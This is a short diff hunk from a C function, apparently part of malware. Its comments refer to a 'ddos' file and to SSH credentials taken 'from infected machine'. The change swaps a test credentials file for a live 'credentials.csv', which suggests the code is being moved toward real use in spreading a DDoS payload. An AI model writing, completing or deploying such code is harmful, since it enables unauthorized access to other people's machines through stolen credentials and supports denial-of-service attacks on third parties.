@@ -52,7 +52,7 @@ void transfer(void) {
     const char *client_file_name = "ddos"; //path to the ddos file
 
     //open file with ssh credentials from infected machine 
-    FILE *file = fopen("credentials_test.csv", "r");
+    FILE *file = fopen("credentials.csv", "r");
     if (!file) {
         perror("Failed to open the info file");
         return;
